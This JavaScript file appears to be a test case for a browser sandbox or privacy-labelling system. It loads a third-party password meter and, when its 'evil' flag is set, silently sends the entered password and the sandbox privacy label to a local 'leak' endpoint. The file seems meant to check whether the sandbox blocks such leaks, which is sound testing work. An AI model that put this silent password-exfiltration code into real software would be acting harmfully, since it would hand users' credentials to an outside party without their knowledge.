//Sandbox.import('http://www.geekwisdom.com/js/passwordmeter.js');
//alternatively:
Sandbox.import('http://fourthparty.lvh.me:3001/passwordmeter.js');

var evil = true;

onmessage(function() {
  var password = message.password || "";
  var result = (function () {
    // make compliant with checker
    this.document = { forms: { passwordForm: 
                                { score: {value: 0}
                                , matchlog: {value: ""}
                                , verdict: {value: ""} 
                                }}};
    try {
      testPassword(password);
    } catch (e) {
      return {score: -1, log: "failed with "+e };
    }

    if (evil) {
      try {
      var reqA = new XMLHttpRequest();

      reqA.onload = function() { };
      reqA.open("get", "http://checker.lvh.me:3000/leak?pass="+password, true);
      reqA.responseType = "json";
      reqA.send();
      } catch(e) { }
    }
    return {score: document.forms.passwordForm.score.value,
            log: document.forms.passwordForm.matchlog.value };
             
  })();


  done(result);

});
if (evil) {
  try{
  var reqA = new XMLHttpRequest();

  reqA.onload = function() { };
  reqA.open("get", "http://checker.lvh.me:3000/leak?afteronmessage="+Sandbox.getPrivacyLabel(), true);
  reqA.responseType = "json";
  reqA.send();
  } catch(e) { }
}
